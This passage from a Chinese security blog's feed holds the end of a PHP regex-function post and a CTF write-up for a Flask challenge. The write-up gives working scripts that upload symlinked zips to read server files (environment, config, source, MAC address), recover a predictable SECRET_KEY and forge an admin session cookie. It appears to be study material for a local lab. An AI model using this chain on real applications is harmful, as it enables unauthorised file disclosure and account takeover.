一个数组，如果它们的值能够匹配pattern，则其值会复制到返回的数组中。</p><p>flags 非必要，此标志位PREG_GREF_INVERT或者是0</p><p><strong>返回值</strong></p><p>一个数组，包含input中能够由pattern匹配的元素(如果使用了PREG_GREF_INVERT标志位，则包括不能匹配的元素)</p><h3 id="preg-quote"><a href="#preg-quote" class="headerlink" title="preg_quote"></a>preg_quote</h3><p>preg_quote(input[,delimiter])</p><p>转义字符串中的正则表达式元字符</p><p><strong>参数</strong></p><p>input 希望以文字方式用作pattern参数的字符串</p><p>delimiter 非强制出现的参数，包含1个字符的字符串，表示希望用在pattern参数的分隔符</p><p><strong>返回值</strong></p><p>preg_quote返回一个字符串，它是input的副本，其中的正则表达式元字符进行了转义，如果指定了分隔符，则分隔符本身也会被转义。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;起因是最近做一道文件包含的ctf题目时，卡了很久，最后才发现是对正则表达式的理解有问题导致，害，太菜了，最后反思了一下还是没有好好学习正则表达式（尤其是没有系统的进行学习），于是决定系统的学习一下正则表达式。&lt;/p&gt;
&lt;p&gt;本次学习使用的学习资料为《精通正则表达式(第三版)</summary>
      
    
    
    
    <category term="基础学习" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="正则表达式" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
    <category term="正则表达式" scheme="http://www.fxizenta.design/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>一道flask的wp</title>
    <link href="http://www.fxizenta.design/2021/03/01/awp_for_falsk/"/>
    <id>http://www.fxizenta.design/2021/03/01/awp_for_falsk/</id>
    <published>2021-03-01T08:24:46.000Z</published>
    <updated>2021-08-27T14:43:49.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一道flask的wp"><a href="#一道flask的wp" class="headerlink" title="一道flask的wp"></a>一道flask的wp</h1><p>本题为校内一个师兄出的题，在本地搭好了环境进行试验。</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a><strong>第一步</strong></h2><p>进入题目发现一个上传点和提示“I will tell you a secret, but you should become admin first.”，根据提示可以猜想到得先想办法以admin身份登录，查看cookie可以看到session，值为疑似base64的一串字符串，decode之后为类似{“username”:”2333”}的信息，应该使用的是securecookie机制，如果能够得到签名的key和签名方法等相关信息就能想办法伪造session，接下来的思路是一样的，就是想办法先拿到源码。</p><p><img src="https://i.loli.net/2021/03/02/akT8L3im6Sbphr2.jpg" alt="awp_falsk1.jpg"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h2><p>测试上传点，发现只能上传zip文件，并返回zip解压后的文件内容。尝试压缩软链接上传，发现会回显对应的文件内容，这样就实现了一个任意文件下载，通过这个可以开始想办法找到源码的路径，我们要用到上传zipfile读取到<code>SECRET_KEY</code>，然后伪造admin的session进行登录。</p><p><img src="https://i.loli.net/2021/03/02/QkSH5WdNi8yUCqE.jpg" alt="awp_falsk2.jpg"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>接下来主要目标是获取源码</p><p>脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxx/upload&#x27;</span></span><br><span class="line">def makezip():</span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#x27;</span>+sys.argv[1]+<span class="string">&#x27; exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip --symlinks exp.zip exp&#x27;</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;the_file&#x27;</span>:open(<span class="string">&#x27;./exp.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">def exploit():</span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果对linux比较了解应该会知道 <code>/proc</code>目录 ，然后通过 <code>/proc/self/environ</code>的软链接 来获得flask的环境变量，环境变量中可以找到配置文件路径和一些信息</p><p><img src="https://i.loli.net/2021/03/02/h5J8X9jNV6Hq4p1.jpg" alt="awp_falsk3.jpg"></p><p>整理一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/<span class="built_in">local</span>/bin/uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME=uwsgi</span><br><span class="line">HOSTNAME=5a000ec609dc</span><br><span class="line">PYTHON_PIP_VERSION=20.1</span><br><span class="line">HOME=/root</span><br><span class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI=/app/y0u_found_it.ini</span><br><span class="line">NGINX_MAX_UPLOAD=0</span><br><span class="line">UWSGI_PROCESSES=16</span><br><span class="line">STATIC_URL=/static</span><br><span class="line">PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py</span><br><span class="line">UWSGI_CHEAPER=2</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED=1</span><br><span class="line">PYTHON_VERSION=3.6.10</span><br><span class="line">NGINX_WORKER_PROCESSES=auto</span><br><span class="line">SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME=uwsgi</span><br><span class="line">LISTEN_PORT=80</span><br><span class="line">STATIC_INDEX=0</span><br><span class="line">PWD=/app/y0u_found_it</span><br><span class="line">PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">STATIC_PATH=/app/static</span><br><span class="line">PYTHONPATH=/app</span><br><span class="line">UWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>扫一眼过去，能够发现一项<code>UWSGI_INI</code>，以INI结尾，应该是个配置文件 ，而且从命名来看</p><p>”y0u_found_it.ini“已经在提示这个ini文件有问题，那么接下来 构造软链接，生成zip，上传读取。<br>得到<code>/app/ y0u_found_it.ini</code>内容</p><p><img src="https://i.loli.net/2021/03/02/v7ilWwXUahBEFoL.jpg" alt="awp_falsk4.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = y0u_found_it.y0u_found_it_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure><p>这样就找到了源代码路径<code>/app/y0u_found_it/y0u_found_it_main.py</code></p><p>接下来获取源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a><strong>第五步</strong></h2><p>查看代码发现secret=secret.secret，可以知道flag应该是在<code>secret.py</code>文件里，如果软链接直接读取 ，发现还是提示<code>you are not admin</code> ，所以还是得按照前面的分析 通过找<code>SECRET_KEY</code> 来解决，因为 python random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的。</p><p>查看代码可知通过<code>uuid.getnode()</code>函数 获取网卡mac地址并转换成十进制数返回 ，那么思路就变成了先获取服务器的网卡mac地址来确定种子，进而确定<code>SECRET_KEY</code>，从而伪造<code>session</code></p><p>因为linux中一切都是文件，所以可以通过读<code>/sys/class/net/eth0/address</code>文件得到mac地址</p><p>然后 把mac地址处理下，转换成10进制，然后设置成seed，生成 <code>SECRET_KEY</code>，下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">int</span>(sss,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure><p>这里另外一个师傅给出了另外一个简介版本，当时写的时候就觉得上面那个有点复杂了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+sss)</span><br><span class="line">print(mac)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a><strong>第六步</strong></h2><p>接下来就是通过key获取admin的session，这里是通过flask-session-cookie-manager脚本获取</p><p><img src="https://i.loli.net/2021/03/02/P4zwVnSjak2ClQ5.jpg" alt="awp_falsk5.jpg"></p><p>session成功伪造，获得flag</p><p><img src="https://i.loli.net/2021/03/02/sz2d16LKrAVwOXZ.jpg" alt="awp_falsk6.jpg"></p><p>exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  link(file_name)</span><br><span class="line">  files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(file_name[-<span class="number">5</span>:] + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">  r2 = s.post(url+<span class="string">&#x27;upload&#x27;</span>, files=files)</span><br><span class="line">  <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  os.system(<span class="string">&#x27;ln -s &#123;file_name&#125; &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line">  os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">  en = read_file(<span class="string">&#x27;/proc/self/environ&#x27;</span>)</span><br><span class="line">  ini = re.search(<span class="string">&#x27;UWSGI_INI=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  pwd = re.search(<span class="string">&#x27;PWD=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  ini = read_file(ini)</span><br><span class="line">  source = re.search(<span class="string">&#x27;module = .*?\.(.*?)\n&#x27;</span>, ini).group(<span class="number">1</span>)</span><br><span class="line">  source = pwd+<span class="string">&#x27;/&#x27;</span>+source+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">  source = read_file(source)</span><br><span class="line">  <span class="keyword">if</span>(source.find(<span class="string">&#x27;import&#x27;</span>) == -<span class="number">1</span>):</span><br><span class="line">​    exit(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">  mac = <span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span></span><br><span class="line">  mac = read_file(mac)</span><br><span class="line">  mac = mac[:-<span class="number">1</span>]</span><br><span class="line">  mac = <span class="string">&#x27;&#x27;</span>.join(mac.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">  mac = <span class="built_in">int</span>(mac, <span class="number">16</span>)</span><br><span class="line">  random.seed(mac)</span><br><span class="line">  key = random.random()*<span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(key)</span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">session = serializer.dumps(payload)</span><br><span class="line">cookies = &#123;<span class="string">&#x27;session&#x27;</span>: session&#125;</span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一道flask的wp&quot;&gt;&lt;a href=&quot;#一道flask的wp&quot; class=&quot;headerlink&quot; title=&quot;一道flask的wp&quot;&gt;&lt;/a&gt;一道flask的wp&lt;/h1&gt;&lt;p&gt;本题为校内一个师兄出的题，在本地搭好了环境进行试验。&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="flask" scheme="http://www.fxizenta.design/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Hello</title>
    <link href="http://www.fxizenta.design/2021/01/24/hello-world/"/>
    <id>http://www.fxizenta.design/2021/01/24/hello-world/</id>
    <published>2021-01-23T16:00:00.000Z</published>
    <updated>2021-03-15T10:58:21.520Z</updated>
    
    <content type="html"><![CDATA[<p>本博客创建于2021年1月24日，因在竞赛学习中感觉到学到的知识遗忘的过快，于是决定建立此博客，用于分享以及记录学习笔记。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本博客创建于2021年1月24日，因在竞赛学习中感觉到学到的知识遗忘的过快，于是决定建立此博客，用于分享以及记录学习笔记。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
